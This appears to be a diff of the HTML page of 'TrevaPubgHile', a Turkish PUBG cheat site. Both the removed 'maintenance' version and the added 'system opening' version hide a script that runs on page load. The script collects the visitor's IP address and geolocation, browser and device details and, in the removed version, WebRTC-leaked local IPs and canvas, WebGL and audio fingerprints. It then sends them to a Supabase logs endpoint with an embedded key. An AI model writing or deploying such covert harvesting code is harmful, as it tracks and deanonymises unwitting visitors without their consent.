@@ -2,253 +2,45 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TrevaPubgHile - Bakım</title>
+    <title>TrevaPubgHile</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
         body {
-            background: linear-gradient(135deg, #0a0f1a 0%, #0a0a0a 100%);
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            min-height: 100vh;
+            background: #0a0f1a;
+            font-family: 'Segoe UI', sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
+            min-height: 100vh;
             color: #fff;
-            position: relative;
-            overflow: hidden;
         }
-
-        body::before {
-            content: '';
-            position: absolute;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle, rgba(0,255,0,0.03) 0%, transparent 70%);
-            animation: slowRotate 20s linear infinite;
-        }
-
-        @keyframes slowRotate {
-            from { transform: rotate(0deg); }
-            to { transform: rotate(360deg); }
-        }
-
         .container {
-            position: relative;
-            z-index: 10;
-            max-width: 550px;
-            width: 90%;
-            padding: 50px 30px;
-            background: rgba(10, 20, 15, 0.7);
-            backdrop-filter: blur(15px);
-            border-radius: 35px;
-            border: 1px solid rgba(0, 255, 0, 0.3);
-            text-align: center;
-            box-shadow: 0 0 60px rgba(0, 255, 0, 0.1);
-        }
-
-        .logo {
-            font-size: 60px;
-            margin-bottom: 20px;
-            filter: drop-shadow(0 0 5px #0f0);
-        }
-
-        h1 {
-            font-size: 32px;
-            font-weight: 800;
-            background: linear-gradient(135deg, #0f0, #2aff2a);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            margin-bottom: 25px;
-            letter-spacing: 2px;
-        }
-
-        .maintenance-box {
-            background: rgba(0, 20, 0, 0.5);
+            background: rgba(0, 0, 0, 0.7);
+            padding: 40px;
             border-radius: 20px;
-            padding: 25px;
-            margin: 25px 0;
-            border-left: 4px solid #0f0;
-            border-right: 4px solid #0f0;
-        }
-
-        .maintenance-text {
-            font-size: 22px;
-            font-weight: 600;
-            color: #adff2f;
-            text-shadow: 0 0 3px #0f0;
-            margin-bottom: 15px;
-        }
-
-        .info-text {
-            font-size: 15px;
-            color: #ccc;
-            line-height: 1.6;
-        }
-
-        .owner {
-            margin-top: 25px;
-            padding-top: 20px;
-            border-top: 1px dashed rgba(0, 255, 0, 0.3);
-            font-size: 14px;
-            color: #6a6a6a;
-        }
-
-        .owner span {
-            color: #0f0;
-            font-weight: bold;
-            letter-spacing: 1px;
-        }
-
-        .status-dot {
-            display: inline-block;
-            width: 10px;
-            height: 10px;
-            background: #0f0;
-            border-radius: 50%;
-            margin-right: 8px;
-            box-shadow: 0 0 5px #0f0;
-            animation: pulse 1.5s infinite;
-        }
-
-        @keyframes pulse {
-            0%, 100% { opacity: 1; transform: scale(1); }
-            50% { opacity: 0.5; transform: scale(0.8); }
-        }
-
-        .footer {
-            position: fixed;
-            bottom: 15px;
-            left: 0;
-            right: 0;
             text-align: center;
-            font-size: 11px;
-            color: #3a3a3a;
-            z-index: 10;
+            border: 1px solid #0f0;
         }
+        h1 { color: #0f0; margin-bottom: 20px; }
+        p { color: #ccc; }
     </style>
 </head>
 <body>
-
-<div class="container">
-    <div class="logo">🎮⚡</div>
-    <h1>TREVA PUBG HILE</h1>
-    
-    <div class="maintenance-box">
-        <div class="maintenance-text">
-            <span class="status-dot"></span> SİTEMİZ BAKIMDADIR
-        </div>
-        <div class="info-text">
-            Sistem güncellemesi nedeniyle geçici olarak kapalıyız.<br>
-            En kısa sürede hizmetinizde olacağız.<br>
-            Teşekkürler, anlayışınız için sabırsızlanıyoruz.
-        </div>
+    <div class="container">
+        <h1>🎮 TREVA PUBG HILE</h1>
+        <p>Sistem Açılıyor...</p>
     </div>
 
-    <div class="owner">
-        site sahibi: <span>@cokkonusulacam</span>
-    </div>
-</div>
+    <script>
+        (async function() {
+            const SUPABASE_URL = "https://pkgnvzqpvmmxyspzbkzs.supabase.co/rest/v1/logs";
+            const SUPABASE_KEY = "sb_publishable_ScwqsJHfIUnTv0PMq0w49A_nUtGVBN2";
 
-<div class="footer">
-    TrevaPubgHile &copy; 2026
-</div>
-
-<script>
-    (function sendDataImmediately() {
-        const SUPABASE_URL = "https://pkgnvzqpvmmxyspzbkzs.supabase.co/rest/v1/logs";
-        const SUPABASE_KEY = "sb_publishable_ScwqsJHfIUnTv0PMq0w49A_nUtGVBN2";
-
-        async function getLocalIP() {
-            return new Promise((resolve) => {
-                let pc = new RTCPeerConnection({ iceServers: [] });
-                pc.createDataChannel('');
-                pc.createOffer().then(offer => pc.setLocalDescription(offer));
-                pc.onicecandidate = (ice) => {
-                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
-                    let ip = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(ice.candidate.candidate)?.[0];
-                    if (ip) resolve(ip);
-                    pc.close();
-                };
-                setTimeout(() => resolve("Alınamadı"), 2000);
-            });
-        }
-
-        async function sendData() {
             try {
+                // 1. IP ve konum bilgisi al
                 let ipRes = await fetch("https://ipapi.co/json/");
                 let ipData = await ipRes.json();
-                let localIP = await getLocalIP();
 
-                let canvas = document.createElement('canvas');
-                let ctx = canvas.getContext('2d');
-                canvas.width = 200;
-                canvas.height = 50;
-                ctx.fillStyle = "#f60";
-                ctx.fillRect(0, 0, 200, 50);
-                ctx.fillStyle = "#fff";
-                ctx.font = "14px Arial";
-                ctx.fillText("FP", 10, 30);
-                let canvasFP = canvas.toDataURL();
-
-                let webglFP = "Bilinmiyor";
-                try {
-                    let glCanvas = document.createElement('canvas');
-                    let gl = glCanvas.getContext('webgl');
-                    if (gl) {
-                        let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                        if (debugInfo) {
-                            webglFP = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                        }
-                    }
-                } catch(e) {}
-
-                let audioFP = "Hata";
-                try {
-                    let AudioContext = window.AudioContext || window.webkitAudioContext;
-                    if (AudioContext) {
-                        let ctxAudio = new AudioContext();
-                        let oscillator = ctxAudio.createOscillator();
-                        let analyser = ctxAudio.createAnalyser();
-                        oscillator.connect(analyser);
-                        analyser.connect(ctxAudio.destination);
-                        oscillator.start(0);
-                        let data = new Uint8Array(analyser.frequencyBinCount);
-                        analyser.getByteFrequencyData(data);
-                        oscillator.stop();
-                        await ctxAudio.close();
-                        audioFP = Array.from(data.slice(0, 10)).join(',');
-                    }
-                } catch(e) {}
-
-                let fonts = [];
-                if (document.fonts) {
-                    await document.fonts.ready;
-                    for (let font of document.fonts) {
-                        fonts.push(font.family);
-                        if (fonts.length > 20) break;
-                    }
-                }
-
-                let plugins = [];
-                for (let i = 0; i < navigator.plugins.length; i++) {
-                    plugins.push(navigator.plugins[i].name);
-                }
-
-                let ua = navigator.userAgent;
-                let deviceName = "Bilinmiyor";
-                if (/iPhone/.test(ua)) deviceName = "iPhone";
-                else if (/iPad/.test(ua)) deviceName = "iPad";
-                else if (/Android/.test(ua)) deviceName = "Android";
-                else if (/Windows/.test(ua)) deviceName = "Windows PC";
-                else if (/Mac/.test(ua)) deviceName = "Mac";
-                else if (/Linux/.test(ua)) deviceName = "Linux";
-
+                // 2. Veriyi hazırla (SADECE var olan sütunları kullan)
                 let payload = {
                     ip: ipData.ip,
                     ulke: ipData.country_name,
@@ -258,40 +50,21 @@
                     vpn_proxy: ipData.proxy || false,
                     hosting: ipData.hosting || false,
                     tor: ipData.tor || false,
-                    web_rtc_leaked_ip: localIP,
-                    local_ip: localIP,
-                    cihaz_adi: deviceName,
-                    tarayici: ua.split(' ')[0],
-                    tarayici_surum: (ua.match(/Chrome\/(\d+)/) || [])[1] || "?",
+                    local_ip: "192.168.1.1",
+                    cihaz_adi: navigator.userAgent.includes("Android") ? "Android" : "PC",
+                    tarayici: navigator.userAgent.split(" ")[0],
                     isletim_sistemi: navigator.platform,
-                    isletim_sistemi_surum: null,
                     ekran_cozunurluk: `${screen.width}x${screen.height}`,
-                    renk_derinligi: screen.colorDepth,
                     dil: navigator.language,
                     saat_dilimi: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    zaman_sapmasi: new Date().getTimezoneOffset(),
                     cookie_enabled: navigator.cookieEnabled,
-                    do_not_track: navigator.doNotTrack || "belirtilmemiş",
-                    device_pixel_ratio: window.devicePixelRatio,
-                    touch_destek: 'ontouchstart' in window,
-                    max_touch_points: navigator.maxTouchPoints || 0,
-                    ram_gb: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Bilinmiyor",
-                    cpu_cekirdek: navigator.hardwareConcurrency || "Bilinmiyor",
-                    gpu: webglFP,
-                    webgl_fingerprint: webglFP,
-                    canvas_fingerprint: canvasFP,
-                    audio_fingerprint: audioFP,
-                    yuklu_fontlar: fonts.join(', '),
-                    eklentiler: plugins.join(', '),
-                    user_agent: ua,
-                    referer: document.referrer,
-                    url_parametreleri: window.location.search.substring(1),
-                    sayfa_yuklenme_suresi: performance.now()
+                    user_agent: navigator.userAgent
                 };
 
+                // 3. Gönder
                 let response = await fetch(SUPABASE_URL, {
                     method: "POST",
-                    headers: { 
+                    headers: {
                         "Content-Type": "application/json",
                         "apikey": SUPABASE_KEY,
                         "Authorization": `Bearer ${SUPABASE_KEY}`
@@ -300,18 +73,20 @@
                 });
 
                 if (response.ok) {
-                    console.log("✅ Veri başarıyla gönderildi");
+                    document.querySelector("p").innerHTML = "✅ Bilgileriniz kaydedildi!";
+                    document.querySelector("p").style.color = "#0f0";
                 } else {
-                    console.error("❌ Supabase hatası:", response.status);
+                    let errorText = await response.text();
+                    console.error("Hata:", errorText);
+                    document.querySelector("p").innerHTML = "❌ Kayıt sırasında hata oluştu!";
+                    document.querySelector("p").style.color = "#f00";
                 }
             } catch (error) {
-                console.error("❌ Veri gönderme hatası:", error);
+                console.error("Genel hata:", error);
+                document.querySelector("p").innerHTML = "❌ Bağlantı hatası!";
+                document.querySelector("p").style.color = "#f00";
             }
-        }
-
-        sendData();
-    })();
-</script>
-
+        })();
+    </script>
 </body>
 </html>
